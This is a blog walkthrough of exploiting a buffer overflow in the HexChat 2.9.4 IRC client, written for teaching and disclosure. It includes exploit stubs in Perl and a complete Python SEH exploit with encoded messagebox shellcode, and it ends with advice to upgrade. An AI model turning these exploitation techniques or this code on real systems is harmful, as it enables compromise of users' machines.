---
layout: post
title: "Buffer Overflow in HexChat 2.9.4"
date: "2013-04-06T14:55:00-04:00"
comments: true
categories:
 - windows
 - hexchat
 - exploit
 - security
---

A buddy of mine, [Mulitia](https://twitter.com/imulitia), and I were talking about 0-days, and he mentioned finding one in Hex-Chat, a popular IRC client. It was super low severity, but still neat. If you entered "/server " followed by 20,000 random characters, the application died. I decided to try to make a working exploit out of this for fun.

<!-- more -->

I contacted HexChat, by initialling going into the #hexchat channel on irc.freenode.net and trying to find a security contact. TingPing said I could give the details specifically through him. Eventually an issue was created: https://github.com/hexchat/hexchat/issues/463

## Walkthrough of the exploit

This exploit was a little more complicated than many I've had to do previously. It has 3 stages, due to bad characters that can't be entered in the payload (pretty much anything non-alpha-numeric).

## The offset

First thing's first, when developing an exploit, you need to have the offset of the buffer so you know where to put executable statements. By using the pattern_create functionality of Mona.py, I made a 25,000 line unique string, and ran it into the program while attached to a debugger.

{% img /images/hexchat_pc.png %}

I then took this long pattern, and pasted it into HexChat's textbox, after a "/server " string:

{% img /images/hexchat_pattern.png %}

Once I hit enter, the debugger stated:

{% blockquote %}
Access violation when writing to [00130000] - use Shift+F7/F8/F9 to pass the exception to the program
{% endblockquote %}

Since an exception was raised, I checked the SEH window, to see if I had overwritten the SEH handler.

{% img /images/hexchat_seh.png %}

Indeed, I had overwritten the SEH handler with "37635236". I then ran mona's pattern_offset to find the offset of the string that would overwrite the SEH handler.

{% img /images/hexchat_po.png %}

Based on this knowledge, I knew the offset would be somewhere around 13340 bytes in. Since this was an SEH exploit, the next step was to find an instruction that did a pop-pop-ret.

## Pop-Pop-Ret

Finding a valid pop-pop-ret instruction became a bit difficult, because I started to find out that HexChat would pretty much only use ASCII characters. Luckily, Mona.py had me covered, and can search for filtered characters:

{% img /images/hexchat_mona_seh.png %}

I went through the seh.txt file that had all the addresses, and found one that I liked:

{% blockquote %}
0x68626463 : pop ebx # pop ebp # ret | asciiprint,ascii,lower {PAGE_EXECUTE_READ} [libglib-2.0-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.26.1.0 (C:\Program Files\HexChat\libglib-2.0-0.dll)
{% endblockquote %}

This string was all lowercase letters, had no ASLR or SafeSEH, so it seemed like a fairly good address to use.

## The jump

I created a little test exploit stub so I could see the memory after the pop-pop-ret occurred. It wasn't really anything special.

```
mandreko$ perl -e 'print "A"x13340 . "\x63\x64\x62\x68" . "C"x11656'
```

I pasted it into HexChat, and saw the same Access Violation. I checked the SEH window to make sure I overwrote properly:

{% img /images/hexchat_seh2.png %}

You can see there, that the SEH is now pointing to the address of the pop-pop-ret. I created a breakpoint for 0x68626463 and hit Shift-F9. I hit the breakpoint, and F7 3 times to step through the pop-pop-ret.

{% img /images/hexchat_after_ppr.png %}

Typically, in an SEH exploit, right before the PPR instruction, you'd put the next instruction that you want to execute, the nseh (more details at [Corelan's excellent blog](https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/)). This instruction is typically a jump. Due to our ascii issue, I found it was possible to do a 21 byte jump, by using a conditional "JA" jump (see [here](http://www.unixwiz.net/techtips/x86-jumps.html) for jump details) instruction. I had to prepend 2 "DEC ESP" instructions to make the conditional jump work, by setting the proper flags. This left my exploit stub looking like:

```
mandreko$ perl -e 'print "A"x13336 . "\x4c\x4c\x77\x21" . "\x63\x64\x62\x68" . "C"x11656'
```

## Getting more space

I ran the exploit stub, followed the pop-pop-ret and then the jump, and found myself in memory that I controlled. That was the good news. Unfortunately, the bad news was that I only had a very limited amount of space to put any payload (43 bytes). My first thought was to use an egghunter, however egghunters had non-ascii characters in them, and when encoded properly, were well over 43 bytes long. This left me thinking for a good while.

After a couple days of thinking, I thought about using a fairly non-traditional method to exploit this. In the stack, way down, was a pointer to the beginning of the buffer I sent into HexChat. I was able to use the [POPAD instruction](https://en.wikipedia.org/wiki/X86_instruction_listings) to get rid of several ESP values at once, since it's Opcode was an ASCII character. By combining 38 POPAD instructions, I was able to get to the pointer in memory, and still have 5 bytes of memory to try to load it. My exploit-stub ended up looking like this:

```
mandreko$ perl -e 'print "A"x13336 . "\x4c\x4c\x77\x21" . "\x63\x64\x62\x68" . "C"x29 . "\x61"x38 . "C"x11589'
```

When I ran it through the debugger, it worked out perfectly.

{% img /images/hexchat_after_popad.png %}

## Finding the jump via corruption

With only 5 bytes remaining, and ASCII encoding requirements, I pondered a bit. I couldn't see any way to get a "JMP ESP". I found a JMP ESP in one of the loaded libraries, but I didn't have enough space to push it into memory and then RETN. For some reason, during testing, I found that some of my non-ASCII characters were bad-characters, and would get translated to RETN statements. I thought perhaps I could use a "PUSH ESP" instruction which was ASCII, and then use a bad-character to convert into a "RETN" instruction, since it typically would not be ASCII (\xc3). It ended up working. I put a "\xE9", and it converted it to "RETN" and then an "\x88". Since I'd never be hitting the "\x88" I figured this would work. I tried it, and miraculously it did! Using a corrupted character actually let it jump!

{% img /images/hexchat_push_esp.png %}

After taking the "RETN", it placed me in an area with thousands of bytes for shellcode.

{% img /images/hexchat_after_push_esp.png %}

From this point, it was just as easy as inserting some alpha-numeric encoded shellcode, and changing some lengths of junk strings.

## The final working exploit

```
#!/usr/bin/python
# HexChat 2.9.4 Local Exploit
# Bug found by Jules Carter < @iMulitia >
# Exploit by Matt "hostess" Andreko < mandreko [at] accuvant.com >
# http://www.mattandreko.com/2013/04/buffer-overflow-in-hexchat-294.html
junk1 = "B"*30
shellcode = (
# msfvenom -p windows/messagebox EXITFUNC=process BufferRegister=ESP -e x86/alpha_mixed -f c
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x78\x59\x68\x6b\x6d\x4b\x4b\x69"
"\x44\x34\x64\x64\x59\x64\x74\x71\x78\x52\x6c\x72\x33\x47\x34"
"\x71\x78\x49\x42\x44\x4e\x6b\x50\x71\x50\x30\x4e\x6b\x64\x36"
"\x54\x4c\x4c\x4b\x44\x36\x77\x6c\x4c\x4b\x33\x76\x77\x78\x4c"
"\x4b\x73\x4e\x51\x30\x4e\x6b\x75\x66\x56\x58\x72\x6f\x72\x38"
"\x51\x65\x68\x73\x43\x69\x37\x71\x38\x51\x39\x6f\x58\x61\x73"
"\x50\x4e\x6b\x30\x6c\x36\x44\x77\x54\x6c\x4b\x42\x65\x75\x6c"
"\x6e\x6b\x73\x64\x36\x48\x31\x68\x46\x61\x6a\x4a\x4e\x6b\x52"
"\x6a\x66\x78\x6e\x6b\x73\x6a\x57\x50\x43\x31\x7a\x4b\x6d\x33"
"\x34\x74\x42\x69\x6c\x4b\x47\x44\x4c\x4b\x67\x71\x48\x6e\x74"
"\x71\x6b\x4f\x36\x51\x79\x50\x6b\x4c\x4e\x4c\x4c\x44\x39\x50"
"\x34\x34\x75\x57\x49\x51\x4a\x6f\x36\x6d\x67\x71\x4a\x67\x5a"
"\x4b\x5a\x54\x67\x4b\x71\x6c\x61\x34\x34\x68\x32\x55\x6d\x31"
"\x6e\x6b\x33\x6a\x47\x54\x76\x61\x38\x6b\x71\x76\x4c\x4b\x64"
"\x4c\x52\x6b\x4e\x6b\x71\x4a\x67\x6c\x67\x71\x4a\x4b\x4e\x6b"
"\x74\x44\x4c\x4b\x76\x61\x69\x78\x4e\x69\x62\x64\x66\x44\x47"
"\x6c\x63\x51\x5a\x63\x6e\x52\x33\x38\x61\x39\x69\x44\x6b\x39"
"\x59\x75\x6c\x49\x58\x42\x73\x58\x4e\x6e\x72\x6e\x56\x6e\x58"
"\x6c\x62\x72\x4d\x38\x4f\x6f\x6b\x4f\x69\x6f\x69\x6f\x4f\x79"
"\x61\x55\x75\x54\x6d\x6b\x31\x6e\x4e\x38\x79\x72\x70\x73\x6f"
"\x77\x45\x4c\x45\x74\x70\x52\x39\x78\x6c\x4e\x4b\x4f\x49\x6f"
"\x59\x6f\x6f\x79\x43\x75\x55\x58\x73\x58\x62\x4c\x70\x6c\x51"
"\x30\x77\x31\x53\x58\x67\x43\x54\x72\x66\x4e\x61\x74\x71\x78"
"\x52\x55\x44\x33\x62\x45\x61\x62\x6d\x58\x51\x4c\x75\x74\x57"
"\x7a\x4c\x49\x58\x66\x73\x66\x6b\x4f\x30\x55\x47\x74\x6b\x39"
"\x4f\x32\x72\x70\x4d\x6b\x39\x38\x6d\x72\x72\x6d\x4f\x4c\x4b"
"\x37\x35\x4c\x67\x54\x30\x52\x5a\x48\x75\x31\x39\x6f\x6b\x4f"
"\x39\x6f\x33\x58\x42\x4f\x34\x38\x53\x68\x31\x30\x72\x48\x35"
"\x31\x73\x57\x61\x75\x62\x62\x35\x38\x72\x6d\x72\x45\x54\x33"
"\x62\x53\x54\x71\x69\x4b\x6f\x78\x33\x6c\x75\x74\x54\x4a\x6f"
"\x79\x78\x63\x61\x78\x72\x78\x45\x70\x77\x50\x75\x70\x70\x68"
"\x72\x6d\x50\x53\x37\x36\x77\x51\x70\x68\x43\x42\x30\x6f\x42"
"\x4d\x71\x30\x35\x38\x52\x4f\x66\x4c\x31\x30\x61\x76\x61\x78"
"\x71\x58\x50\x65\x42\x4c\x32\x4c\x55\x61\x5a\x69\x6e\x68\x72"
"\x6c\x61\x34\x44\x50\x4f\x79\x4d\x31\x56\x51\x4b\x62\x33\x62"
"\x61\x43\x46\x31\x52\x72\x39\x6f\x58\x50\x46\x51\x49\x50\x42"
"\x70\x69\x6f\x36\x35\x34\x48\x41\x41"
)
junk2 = "A"*(13306-len(shellcode))
stage1 = "\x4c\x4c\x77\x21" # 21 byte jump (JA)
ret = "\x63\x64\x62\x68" # ASCII PPR
junk3 = "C"*29
stage2 = "\x61"*38 # POPAD x 38
stage2 += "\x54" # PUSH ESP
stage2 += "\xE9" # RETN # This byte is a bad char, but gets converted to RETN and \x88
junk4 = "D"*11586

print "Copy this text, and enter into HexChat's textbox: \"/server [string]\"" 
print junk1 + shellcode + junk2 + stage1 + ret + junk3 + stage2 + junk4
```

## Demo time!

Here is a video demo of the exploit working with a simple messagebox payload.
{% youtube izmMjz_g-84 %}

## Remediation

It's suggested that all users upgrade to 2.9.5 where this vulnerability has been fixed. HexChat is available here: http://hexchat.org/downloads.html
